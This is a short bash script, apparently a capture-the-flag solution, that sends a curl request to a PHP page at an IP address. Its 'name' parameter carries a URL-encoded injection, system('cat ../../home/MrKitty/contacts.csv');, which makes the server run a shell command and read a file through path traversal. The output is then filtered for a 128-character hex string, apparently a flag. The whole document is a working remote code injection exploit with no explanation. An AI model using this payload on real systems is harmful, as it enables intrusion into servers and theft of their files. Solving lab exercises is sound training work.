#!/bin/bash

curl -sk 'https://46.105.49.65/31817b111a94/index.php?contact=Lemmiwinks&name=system%28%27cat%20../../home/MrKitty/contacts.csv%27%29%3B' \
     | grep -oE '[0-9a-f]{128}'
